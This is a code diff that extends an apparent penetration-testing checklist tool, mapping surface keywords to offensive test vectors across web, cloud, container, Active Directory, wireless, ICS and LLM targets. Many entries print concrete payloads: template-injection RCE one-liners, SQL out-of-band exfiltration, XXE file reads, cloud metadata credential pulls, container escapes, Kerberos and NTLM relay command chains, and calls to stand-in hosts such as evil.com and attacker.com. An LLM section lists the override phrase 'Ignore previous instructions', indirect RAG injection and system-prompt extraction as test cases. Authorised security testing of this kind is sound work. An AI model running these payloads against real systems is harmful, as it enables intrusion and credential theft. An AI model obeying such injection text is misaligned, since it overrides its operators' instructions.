@@ -194,7 +194,7 @@ const SURFACE_VECTORS: {
     ],
   },
   {
-    pattern: /pay|checkout|cart|order|price|amount|balance|transfer|wallet|credit|debit|invoice/i,
+    pattern: /pay|checkout|cart|order|price|amount|balance|money.?transfer|bank.?transfer|wallet|credit|debit|invoice/i,
     vectors: [
       { pillar: 2, category: "Parameter Tampering", test: "Set quantity to -1 or 0, price to 0.001, amount to negative — does the server validate?" },
       { pillar: 2, category: "Race Condition (TOCTOU)", test: "Send 10 concurrent transfer/payment requests — does it debit once or ten times?" },
@@ -280,7 +280,7 @@ const SURFACE_VECTORS: {
     ],
   },
   {
-    pattern: /traffic|intercept|proxy|burp|request|response|header|cookie|cors|csp|hsts|network|http|redirect/i,
+    pattern: /traffic|intercept|proxy|burp|http.?request|http.?response|header.?inject|cookie|cors|csp|hsts|network.?traffic|redirect/i,
     vectors: [
       { pillar: 2, category: "Hidden Endpoints", test: "Capture all traffic during normal usage — find endpoints not in docs: internal APIs, debug routes, health checks, metrics" },
       { pillar: 2, category: "Header Injection", test: "Inject X-Forwarded-For, X-Original-URL, X-Rewrite-URL to bypass IP/path restrictions" },
@@ -288,6 +288,308 @@ const SURFACE_VECTORS: {
       { pillar: 1, category: "CORS Misconfiguration", test: "Send Origin: https://evil.com — does the server reflect it in Access-Control-Allow-Origin? Test with null origin." },
       { pillar: 2, category: "Redirect Chain Abuse", test: "Follow all 3xx redirects manually — can open redirects chain to steal tokens via Referer or fragment?" },
       { pillar: 4, category: "CSP Bypass", test: "If CSP allows unsafe-inline, script-src with a CDN, or missing frame-ancestors — test XSS/clickjacking through the gap" },
+    ],
+  },
+  // --- XSS ---
+  {
+    pattern: /xss|cross.?site.?script|reflected|stored|dom.?xss|blind.?xss/i,
+    vectors: [
+      { pillar: 2, category: "WAF Bypass", test: "Split payload across duplicate parameters, use double-encoding (%253C), fullwidth Unicode, or multipart boundary confusion to bypass WAF" },
+      { pillar: 2, category: "Context-Specific Payload", test: "Identify injection context (HTML body, attribute, JS string, template literal, AngularJS) and use the matching escape/payload" },
+      { pillar: 2, category: "DOM XSS", test: "Trace location.hash, postMessage, document.referrer to innerHTML/document.write sinks — inject via fragment/message" },
+      { pillar: 2, category: "Blind XSS", test: "Inject OOB probe in User-Agent, Referer, contact forms, support tickets, file metadata — wait for admin-context callback" },
+      { pillar: 2, category: "SVG/File XSS", test: "Upload SVG with onload=fetch(CALLBACK), or inject XXE payload in SVG to chain XSS+XXE" },
+      { pillar: 1, category: "Inversion", test: "If WAF blocks <script>, test <details/open/ontoggle>, <input autofocus onfocus>, <video onloadstart> — alternative tags/events" },
+    ],
+  },
+  // --- SQL Injection ---
+  {
+    pattern: /sqli|sql.?inject|database|mysql|postgres|mssql|oracle|mariadb|sqlite/i,
+    vectors: [
+      { pillar: 2, category: "Second-Order SQLi", test: "Register with username admin'-- then trigger password reset or profile export — does the stored input hit an unsafe query later?" },
+      { pillar: 2, category: "Stacked Queries RCE", test: "MSSQL: xp_cmdshell + nslookup CALLBACK. PostgreSQL: COPY TO PROGRAM. MySQL: LOAD_FILE/INTO OUTFILE" },
+      { pillar: 2, category: "OOB Exfiltration", test: "MSSQL: xp_dirtree to UNC. Oracle: UTL_HTTP.REQUEST. MySQL: LOAD_FILE to DNS — exfiltrate when no visible output" },
+      { pillar: 2, category: "NoSQL Injection", test: "MongoDB: replace password with {$gt:''}, inject {$where:'sleep(5000)'}, use [$ne] in query string bracket notation" },
+      { pillar: 2, category: "ORM Injection", test: "Sequelize: {$like:'%admin%'} in JSON body. Hibernate: HQL injection via CAST. Prisma: $queryRaw with unsanitized orderBy" },
+      { pillar: 1, category: "Inversion", test: "If basic SQLi fails — try different quote types, comment styles (--,--%20,#,;%00), or time-based blind with SLEEP/BENCHMARK" },
+    ],
+  },
+  // --- SSRF ---
+  {
+    pattern: /ssrf|server.?side.?request|url.?fetch|webhook|pdf.?gen|image.?proxy/i,
+    vectors: [
+      { pillar: 2, category: "Cloud Metadata", test: "Inject http://169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS), metadata.google.internal (GCP), 169.254.169.254/metadata/identity (Azure)" },
+      { pillar: 2, category: "DNS Rebinding", test: "Use a rebinding domain (rbndr.us) that alternates between your IP and 127.0.0.1 with TTL 0 to bypass allowlist-then-fetch" },
+      { pillar: 2, category: "Protocol Smuggling", test: "Try gopher:// to send raw TCP to internal Redis/memcached, dict:// for service probing, file:// for local file read" },
+      { pillar: 1, category: "Inversion", test: "If direct IPs are blocked — try decimal IP (2130706433), IPv6 (::1), DNS that resolves to 127.0.0.1, URL with @redirect" },
+    ],
+  },
+  // --- SSTI ---
+  {
+    pattern: /ssti|template.?inject|jinja|twig|freemarker|velocity|pebble|thymeleaf/i,
+    vectors: [
+      { pillar: 2, category: "Detection Polyglot", test: "Inject <%'${{/#{@}}%>{{ in every reflected input — a 500 or template stack trace confirms template evaluation" },
+      { pillar: 2, category: "Engine Identification", test: "{{7*7}} vs ${7*7}: result 49 for {{}} → Jinja2 if {{7*'7'}}=7777777, Twig if 49. ${} → Freemarker if ${'ab'?upper_case}=AB" },
+      { pillar: 2, category: "Jinja2 RCE", test: "{{ lipsum.__globals__['os'].popen('id').read() }} or {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}" },
+      { pillar: 2, category: "Twig/Freemarker/Velocity RCE", test: "Twig: {{['id']|filter('system')}}. Freemarker: ${'freemarker.template.utility.Execute'?new()('id')}. Velocity: #set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))" },
+    ],
+  },
+  // --- XXE ---
+  {
+    pattern: /xxe|xml.?external|xml.?inject|xml.?parse|docx.?upload|svg.?upload|xlsx.?parse/i,
+    vectors: [
+      { pillar: 2, category: "Classic XXE", test: "POST with Content-Type: application/xml, <!ENTITY xxe SYSTEM 'file:///etc/passwd'> — if file contents appear, external entities resolve" },
+      { pillar: 2, category: "Blind OOB XXE", test: "Parameter entity loading external DTD that exfiltrates file contents via HTTP callback to your server" },
+      { pillar: 2, category: "Office Document XXE", test: "Modify [Content_Types].xml or xl/sharedStrings.xml inside .docx/.xlsx with XXE entity — if callback fires, document parser is vulnerable" },
+      { pillar: 2, category: "SVG XXE", test: "Upload SVG with <!ENTITY xxe SYSTEM 'file:///etc/passwd'><text>&xxe;</text> — if file contents render, image processor has XXE" },
+    ],
+  },
+  // --- Deserialization ---
+  {
+    pattern: /deseriali|serial|pickle|marshal|ysoserial|phar|viewstate|objectinput/i,
+    vectors: [
+      { pillar: 2, category: "Java Deser", test: "ysoserial CommonsCollections/Spring gadget as Base64 cookie or POST param — DNS callback confirms RCE via deserialization" },
+      { pillar: 2, category: "PHP Phar", test: "Submit phar:///tmp/uploaded.jpg as file path — if destruct/wakeup fires, phar deserialization triggers magic methods" },
+      { pillar: 2, category: "Python Pickle", test: "Inject cos\\nsystem\\n payload as Base64 session cookie — if callback fires, pickle.loads() on untrusted input" },
+      { pillar: 2, category: ".NET TypeNameHandling", test: "JSON body with $type pointing to ObjectDataProvider/Process — if DNS callback fires, Newtonsoft.Json instantiates arbitrary types" },
+    ],
+  },
+  // --- Prototype Pollution ---
+  {
+    pattern: /prototype.?pollut|__proto__|constructor.?prototype|merge|lodash.?merge|deep.?extend/i,
+    vectors: [
+      { pillar: 2, category: "JSON Body Pollution", test: "Send {\"__proto__\":{\"isAdmin\":true}} to merge/update endpoint — if subsequent request grants admin, prototype was polluted" },
+      { pillar: 2, category: "Query Param Pollution", test: "?constructor[prototype][isAdmin]=true — if behavior changes, query parser populates prototype chain" },
+      { pillar: 2, category: "PP2RCE Gadget", test: "Pollute shell/NODE_OPTIONS on a merge endpoint that later calls child_process — DNS callback confirms RCE via pollution" },
+    ],
+  },
+  // --- Cache Poisoning & Request Smuggling ---
+  {
+    pattern: /cache.?poison|smuggl|desync|cl.te|te.cl|h2\.cl|pipeline|unkeyed/i,
+    vectors: [
+      { pillar: 2, category: "Unkeyed Header", test: "Add X-Forwarded-Host: attacker.com to a cacheable page — if reflected in cache, visitors get poisoned response" },
+      { pillar: 2, category: "CL.TE Desync", test: "POST with CL:6 + TE:chunked, body 0\\r\\n\\r\\nG — if next request gets 405 GPOST, frontend/backend disagree on body boundary" },
+      { pillar: 2, category: "H2 Smuggling", test: "HTTP/2 POST with explicit content-length:0 but non-empty body containing a smuggled GET — if admin page returns, H2→H1 downgrade desync" },
+      { pillar: 2, category: "Response Queue Poison", test: "Pipeline two requests where the first smuggles a prefix — if you receive another user's response, queue is desynchronized" },
+      { pillar: 1, category: "Cache Key Normalization", test: "Request /path vs /Path vs /path/ vs /path;x — if two variants share a cache entry, poison one to serve via the other" },
+    ],
+  },
+  // --- Credential Attacks ---
+  {
+    pattern: /credential|password|brute.?force|spray|stuff|lockout|mfa|2fa|otp|backup.?code/i,
+    vectors: [
+      { pillar: 2, category: "Password Spray", test: "1 attempt per account across N accounts, stay at threshold-1 — probe lockout threshold on sacrificial account first" },
+      { pillar: 2, category: "Rate Limit Bypass", test: "Rotate X-Forwarded-For, X-Real-IP per request. Try null byte or case-change on username. Use alternate API version/format" },
+      { pillar: 2, category: "Username Enumeration", test: "Compare response time, body size, error text between valid and invalid usernames — any consistent delta leaks existence" },
+      { pillar: 2, category: "Default Credentials", test: "Tomcat:tomcat/tomcat, Jenkins:admin/admin, Grafana:admin/admin, phpMyAdmin:root/empty, Spring Actuator:no-auth" },
+      { pillar: 2, category: "MFA Bypass", test: "Manipulate 2FA response (false→true), reuse OTP code, skip /verify-2fa and go directly to /dashboard, brute-force 4-6 digit code" },
+    ],
+  },
+  // --- Cloud Security ---
+  {
+    pattern: /cloud|aws|azure|gcp|s3|bucket|iam|lambda|ec2|metadata|imds|serverless/i,
+    vectors: [
+      { pillar: 2, category: "IMDS v1 SSRF", test: "curl 169.254.169.254/latest/meta-data/iam/security-credentials/ from any SSRF vector — if credentials return, IMDSv2 not enforced" },
+      { pillar: 2, category: "S3 Bucket Misconfiguration", test: "aws s3 ls s3://{company}-{backup,dev,assets,logs} --no-sign-request — if listing or read succeeds, bucket is public" },
+      { pillar: 2, category: "IAM Privilege Escalation", test: "Check for iam:PassRole + lambda:CreateFunction or ec2:RunInstances — create resource that assumes higher-privilege role" },
+      { pillar: 2, category: "Lambda Env Leakage", test: "aws lambda get-function — if Environment.Variables contains DB creds/API keys in plaintext, secrets leak to any GetFunction principal" },
+      { pillar: 2, category: "Cross-Account Trust", test: "Inspect AssumeRolePolicyDocument for Principal:* or missing sts:ExternalId condition — assume-role from your account" },
+      { pillar: 2, category: "Azure IMDS Token", test: "curl -H 'Metadata:true' 169.254.169.254/metadata/identity/oauth2/token — if access_token returns, managed identity is reachable" },
+    ],
+  },
+  // --- Container Security ---
+  {
+    pattern: /container|docker|kubernetes|k8s|pod|kubelet|etcd|helm|registry|cgroup/i,
+    vectors: [
+      { pillar: 2, category: "Docker Socket Escape", test: "ls -la /var/run/docker.sock — if writable, spawn privileged container mounting host root and read /etc/shadow" },
+      { pillar: 2, category: "K8s Service Account Abuse", test: "cat /var/run/secrets/kubernetes.io/serviceaccount/token + query kubernetes.default.svc — if secrets list, RBAC misconfigured" },
+      { pillar: 2, category: "Exposed Kubelet", test: "curl -sk https://{node}:10250/pods — if pod listing returns without auth, kubelet is unauthenticated → RCE on pods via /run" },
+      { pillar: 2, category: "Privileged Container Escape", test: "Check CapEff in /proc/1/status — if all caps, cgroup release_agent escape to host" },
+      { pillar: 2, category: "Exposed etcd", test: "curl http://{ip}:2379/v2/keys/?recursive=true or etcdctl get / --prefix — if secrets return, entire cluster credentials exposed" },
+      { pillar: 2, category: "Registry Without Auth", test: "curl https://{registry}/v2/_catalog — if repos list without credentials, check image configs for ENV secrets" },
+    ],
+  },
+  // --- Active Directory ---
+  {
+    pattern: /active.?directory|\bAD\b|kerberos|ldap|ntlm|domain.?controller|\bDC\b|bloodhound|spn|gpo/i,
+    vectors: [
+      { pillar: 2, category: "Kerberoasting", test: "GetUserSPNs -request → TGS tickets → hashcat -m 13100 — if service account password cracks, check DA membership" },
+      { pillar: 2, category: "AS-REP Roasting", test: "GetNPUsers with user list — accounts with DONT_REQUIRE_PREAUTH return crackable hashes without authentication" },
+      { pillar: 2, category: "ACL Abuse", test: "BloodHound shortest path to DA — GenericAll: reset password, WriteDACL: grant yourself GenericAll, WriteOwner: take ownership" },
+      { pillar: 2, category: "NTLM Relay", test: "crackmapexec --gen-relay-list for hosts without SMB signing + PetitPotam/PrinterBug coercion → ntlmrelayx to LDAP/SMB" },
+      { pillar: 2, category: "ADCS ESC1-ESC8", test: "certipy find -vulnerable — if template has enrollee-supplies-SAN + low-priv enrollment + auth EKU → impersonate DA" },
+      { pillar: 2, category: "DCSync", test: "With Replicating Directory Changes rights → secretsdump -just-dc → if krbtgt hash dumps, full domain compromise" },
+    ],
+  },
+  // --- Network Pivoting ---
+  {
+    pattern: /pivot|lateral|movement|tunnel|forward|relay|chisel|ligolo|socks|proxy.?chain/i,
+    vectors: [
+      { pillar: 2, category: "SSH Dynamic Forwarding", test: "ssh -D 1080 pivot_host → proxychains nmap internal subnet — if internal hosts respond, segmentation bypassed" },
+      { pillar: 2, category: "Pass-the-Hash", test: "psexec/crackmapexec -H {NT_HASH} → if SYSTEM shell without plaintext password, PtH confirmed across all hosts with that local admin" },
+      { pillar: 2, category: "Pass-the-Ticket", test: "Export TGT with getTGT/mimikatz → KRB5CCNAME=ticket.ccache psexec -k -no-pass — Kerberos-only lateral, bypasses NTLM detection" },
+      { pillar: 2, category: "Chisel Reverse Tunnel", test: "chisel server --reverse on attack box + chisel client R:socks on target — if internal services respond through SOCKS, firewall egress filtering bypassed" },
+      { pillar: 2, category: "LOLBin Lateral", test: "wmic /node:{target} process call create or schtasks /create /s {target} — no third-party binary needed" },
+    ],
+  },
+  // --- DNS & Subdomain ---
+  {
+    pattern: /dns|subdomain|zone.?transfer|axfr|takeover|cname|nameserver|resolv/i,
+    vectors: [
+      { pillar: 2, category: "Zone Transfer", test: "dig axfr {domain} @{ns} for every authoritative NS — if full zone returns, entire DNS inventory exposed" },
+      { pillar: 2, category: "Subdomain Takeover", test: "subfinder | dnsx -cname — if CNAME points to deprovisioned S3/Azure/Heroku/GitHub and service returns NoSuchBucket/404, claim it" },
+      { pillar: 2, category: "DNS Rebinding", test: "Rebinding domain alternating your IP/127.0.0.1 with TTL 0 submitted to URL fetch — if internal content returns, SSRF bypass confirmed" },
+      { pillar: 1, category: "Wildcard Detection", test: "dig doesnotexist12345.{domain} — if resolves, switch to filtered brute-force comparing against wildcard IP" },
+    ],
+  },
+  // --- Secret Scanning ---
+  {
+    pattern: /secret|leak|credential.?scan|gitleaks|trufflehog|git.?history|\.env|config.?file/i,
+    vectors: [
+      { pillar: 2, category: "Git History Secrets", test: "gitleaks detect or trufflehog git — scan entire commit history for API keys, tokens, passwords committed then 'removed'" },
+      { pillar: 2, category: "Env File Exposure", test: "Request /.env, /config/.env, /.env.production, /wp-config.php.bak, /application.yml — if readable, secrets exposed" },
+      { pillar: 2, category: "Cloud Metadata Secrets", test: "Check /proc/1/environ, /proc/self/environ for leaked env vars containing tokens, keys, database URIs" },
+      { pillar: 1, category: "Inversion", test: "Even if .env returns 403 — try .env.bak, .env.old, .env.swp, .env~ — backup files often bypass access rules" },
+    ],
+  },
+  // --- Supply Chain ---
+  {
+    pattern: /supply.?chain|dependency|lockfile|sbom|npm.?audit|pip.?audit|typosquat|confusion/i,
+    vectors: [
+      { pillar: 2, category: "Dependency Confusion", test: "Check if internal package names exist on public npm/PyPI — if not, register and check if the target installs your version" },
+      { pillar: 2, category: "Known CVE in Deps", test: "npm audit / pip-audit / trivy fs — flag any dependency with a known exploitable CVE, then check if the vulnerable code path is reachable" },
+      { pillar: 2, category: "Lockfile Integrity", test: "Compare lockfile hashes against registry — a tampered lockfile installs a different package than expected" },
+      { pillar: 1, category: "Inversion", test: "Even with 0 audit findings — are devDependencies installed in production? Is postinstall running arbitrary scripts?" },
+    ],
+  },
+  // --- IoT / Embedded ---
+  {
+    pattern: /iot|firmware|embedded|uart|jtag|serial|default.?cred|smart.?device|zigbee|mqtt/i,
+    vectors: [
+      { pillar: 2, category: "Default Credentials", test: "admin:admin, root:root, admin:1234, vendor-specific from cirt.net/passwords — many IoT devices ship with unchanged defaults" },
+      { pillar: 2, category: "Firmware Extraction", test: "binwalk -e firmware.bin — extract filesystem, search for hardcoded credentials, private keys, debug interfaces" },
+      { pillar: 2, category: "UART/JTAG Debug", test: "Physical access: identify UART pins with multimeter, connect at common baud rates (115200) — if shell drops, full device access" },
+      { pillar: 2, category: "MQTT No Auth", test: "mosquitto_sub -h {target} -t '#' — if messages stream without credentials, MQTT broker is unauthenticated" },
+    ],
+  },
+  // --- LLM / AI Security ---
+  {
+    pattern: /llm|ai.?security|prompt.?inject|jailbreak|agent|chatbot|rag|embedding/i,
+    vectors: [
+      { pillar: 2, category: "Prompt Injection", test: "Inject 'Ignore previous instructions and...' in every user-controlled input that reaches the LLM — does it override the system prompt?" },
+      { pillar: 2, category: "Indirect Injection", test: "Place instructions in documents the RAG pipeline retrieves — if the LLM follows them, indirect injection confirmed" },
+      { pillar: 2, category: "Data Exfiltration", test: "Ask the LLM to include system prompt, training data, or other users' conversations in its output — test both direct and encoded extraction" },
+      { pillar: 2, category: "Tool Abuse", test: "If the LLM has tool access — can a crafted prompt make it call tools with attacker-controlled arguments? (SSRF via URL tool, file read via code tool)" },
+    ],
+  },
+  // --- Social Engineering ---
+  {
+    pattern: /social.?eng|phish|pretext|vishing|smishing|spear|whaling|impersonat/i,
+    vectors: [
+      { pillar: 2, category: "Phishing Simulation", test: "Send crafted email with canary link to approved recipient list — track open rate, click rate, credential submission rate" },
+      { pillar: 2, category: "Pretexting", test: "Call the target posing as IT support/vendor — does the person give credentials, MFA codes, or VPN access without verification?" },
+      { pillar: 2, category: "Spear Phishing", test: "Personalized email using OSINT (LinkedIn, company blog) with urgent pretext — higher click rate than generic phishing" },
+      { pillar: 1, category: "Inversion", test: "What would make YOUR phishing fail? Multi-factor auth, URL scanning, security awareness training — test if these controls actually stop it" },
+    ],
+  },
+  // --- Red Team ---
+  {
+    pattern: /red.?team|kill.?chain|foothold|persist|c2|command.?control|beacon|exfil|evasion/i,
+    vectors: [
+      { pillar: 2, category: "Initial Access", test: "Phishing, exposed service exploit, default creds, password spray — which path gives the first foothold fastest?" },
+      { pillar: 2, category: "Persistence", test: "Cron/systemd/scheduled task, registry run key, DLL hijack, startup folder — does it survive reboot? Does blue team detect it?" },
+      { pillar: 2, category: "C2 Channel", test: "HTTP/HTTPS beaconing, DNS tunneling, WebSocket, cloud storage (S3/Blob) — which channel survives egress filtering?" },
+      { pillar: 2, category: "Exfiltration", test: "Data out via DNS, HTTPS, ICMP, steganography — test DLP controls, check if volume/frequency triggers alerts" },
+      { pillar: 4, category: "Detection Twin", test: "For every offensive action, write the detection rule that should catch it — if blue team's SIEM doesn't fire, the control is missing" },
+    ],
+  },
+  // --- Smart Contracts ---
+  {
+    pattern: /smart.?contract|solidity|ethereum|defi|flash.?loan|reentrancy|evm|web3|blockchain/i,
+    vectors: [
+      { pillar: 2, category: "Reentrancy", test: "Call a function that sends ETH before updating state — can a malicious receive() callback re-enter and drain funds?" },
+      { pillar: 2, category: "Flash Loan Attack", test: "Borrow massive amount, manipulate oracle/pool price, profit, repay in one transaction — test with Foundry fork" },
+      { pillar: 2, category: "Oracle Manipulation", test: "Is the price feed from a single DEX pool? Manipulate spot price with large swap before the vulnerable call" },
+      { pillar: 2, category: "Access Control", test: "Can arbitrary addresses call owner-only functions? Is tx.origin used instead of msg.sender for auth?" },
+    ],
+  },
+  // --- Wireless ---
+  {
+    pattern: /wireless|wifi|wpa|wep|bluetooth|ble|deauth|evil.?twin|antenna|aircrack/i,
+    vectors: [
+      { pillar: 2, category: "WPA2 Handshake Capture", test: "airodump-ng + deauth → capture 4-way handshake → hashcat -m 22000 — if password cracks, WiFi compromised" },
+      { pillar: 2, category: "Evil Twin", test: "Clone SSID with stronger signal, force deauth, capture credentials on fake captive portal — test with hostapd-mana" },
+      { pillar: 2, category: "BLE Sniffing", test: "Use Ubertooth or nRF52840 to sniff BLE pairing — if static passkey or Just Works, intercept communications" },
+      { pillar: 1, category: "Inversion", test: "WPA3 SAE: test Dragonblood side-channel attacks. WPA-Enterprise: test PEAP without server cert validation (evil RADIUS)" },
+    ],
+  },
+  // --- Binary / Reverse Engineering ---
+  {
+    pattern: /binary|reverse.?eng|ghidra|ida|radare|disassemb|exploit.?dev|buffer|overflow|rop|shellcode/i,
+    vectors: [
+      { pillar: 2, category: "Buffer Overflow", test: "Fuzz inputs with pattern_create — if crash, check EIP/RIP overwrite, map offsets, build ROP chain or ret2libc" },
+      { pillar: 2, category: "Format String", test: "Send %x.%x.%x.%x in string inputs — if stack values leak, format string vulnerability confirmed → arbitrary read/write" },
+      { pillar: 2, category: "Hardcoded Secrets", test: "strings + grep -i password/key/token on the binary — check .rodata and .data sections for embedded credentials" },
+      { pillar: 1, category: "Inversion", test: "NX enabled? Use ROP. ASLR? Leak address first. Stack canary? Overwrite only the return address via format string" },
+    ],
+  },
+  // --- Thick Client ---
+  {
+    pattern: /thick.?client|desktop.?app|electron|winforms|wpf|swing|qt|native.?app/i,
+    vectors: [
+      { pillar: 2, category: "Local Proxy Intercept", test: "Route traffic through Burp/mitmproxy — does the app validate TLS certs? Pin certificates? Fall back to HTTP?" },
+      { pillar: 2, category: "Local Storage Secrets", test: "Check AppData, LocalStorage, registry, config files for plaintext credentials, tokens, API keys" },
+      { pillar: 2, category: "DLL Hijacking", test: "Place malicious DLL in app directory matching a missing import — if loaded, code execution via search order hijacking" },
+      { pillar: 2, category: "Memory Inspection", test: "Attach debugger, search process memory for credentials, decryption keys, session tokens in plaintext" },
+    ],
+  },
+  // --- Crypto / TLS ---
+  {
+    pattern: /crypto|tls|ssl|cipher|certificate|hsts|pinning|encryption|hash|bcrypt|sha|aes/i,
+    vectors: [
+      { pillar: 2, category: "Weak Cipher Suites", test: "testssl.sh or sslscan — flag CBC, RC4, 3DES, export ciphers, TLS 1.0/1.1, missing PFS" },
+      { pillar: 2, category: "Certificate Issues", test: "Check expiry, hostname mismatch, self-signed, weak key (RSA <2048), missing OCSP stapling, bad chain" },
+      { pillar: 2, category: "Weak Hashing", test: "If passwords use MD5/SHA1/unsalted — crack with hashcat/john. If JWT uses HS256 with weak secret — brute-force" },
+      { pillar: 1, category: "Inversion", test: "HSTS deployed? Check for missing includeSubdomains or max-age too low. Certificate pinning? Check for pin rotation/backup" },
+    ],
+  },
+  // --- GraphQL ---
+  {
+    pattern: /graphql|gql|introspect|mutation|subscription|schema/i,
+    vectors: [
+      { pillar: 2, category: "Introspection Leak", test: "Send {__schema{types{name,fields{name}}}} — if full schema returns, map all types, queries, mutations including internal ones" },
+      { pillar: 2, category: "Authorization Bypass", test: "Query a field your role shouldn't access — does the resolver enforce auth per field, or only at the query level?" },
+      { pillar: 2, category: "Nested Query DoS", test: "Send deeply nested query (user{friends{friends{friends...}}}) — if no depth/complexity limit, server exhausts resources" },
+      { pillar: 2, category: "Batch Attack", test: "Send array of queries [{query1},{query2},...] — does rate limiting apply per batch or per query inside the batch?" },
+    ],
+  },
+  // --- SCADA / ICS / OT ---
+  {
+    pattern: /scada|ics|ot|plc|modbus|dnp3|bacnet|industrial|hmi|dcs|opcua/i,
+    vectors: [
+      { pillar: 2, category: "Unauthenticated Protocol", test: "Modbus TCP has no auth by default — read holding registers, write coils without credentials to test segmentation" },
+      { pillar: 2, category: "HMI Web Interface", test: "Many HMIs expose HTTP interfaces with default creds or no auth — test for command injection in parameter fields" },
+      { pillar: 2, category: "Network Segmentation", test: "Can IT network reach OT network? Probe from compromised IT host with Modbus/BACnet scanner to test isolation" },
+      { pillar: 1, category: "Inversion", test: "Even 'air-gapped' networks have USB, maintenance laptops, cellular modems — verify physical isolation claims" },
+    ],
+  },
+  // --- VoIP ---
+  {
+    pattern: /voip|sip|rtp|pbx|asterisk|freepbx|telephony|ivr/i,
+    vectors: [
+      { pillar: 2, category: "SIP Enumeration", test: "svmap/svwar to discover SIP devices and enumerate extensions — if extensions list, brute-force credentials with svcrack" },
+      { pillar: 2, category: "RTP Interception", test: "If RTP unencrypted (no SRTP) — capture with Wireshark, decode with sox — if voice plays back, calls are interceptable" },
+      { pillar: 2, category: "Toll Fraud", test: "Register as a valid extension, attempt outbound calls to premium numbers — if connected, PBX allows unauthorized calling" },
+    ],
+  },
+  // --- Forensics ---
+  {
+    pattern: /forensic|memory.?dump|volatility|disk.?image|pcap|artifact|evidence|timeline/i,
+    vectors: [
+      { pillar: 2, category: "Memory Analysis", test: "volatility imageinfo → pslist, netscan, hashdump, malfind — extract running processes, network connections, injected code, credentials" },
+      { pillar: 2, category: "Disk Timeline", test: "Build MFT/journal timeline, check $UsnJrnl, prefetch, shimcache, amcache — reconstruct execution and file access history" },
+      { pillar: 2, category: "Network Forensics", test: "pcap analysis: extract files with NetworkMiner, follow TCP streams, check DNS for C2 domains, extract credentials from cleartext protocols" },
+      { pillar: 1, category: "Anti-Forensics Check", test: "Look for timestomping (MFT vs $SI mismatch), log gaps, wiped event logs, Mimikatz artifacts in memory" },
     ],
   },
 ];
@@ -299,7 +601,7 @@ const SURFACE_VECTORS: {
  */
 export function counterLogicFor(
   surfaceLabel: string,
-  limit = 4,
+  limit = 6,
 ): CounterLogicVector[] {
   const matched: CounterLogicVector[] = [];
   for (const entry of SURFACE_VECTORS) {
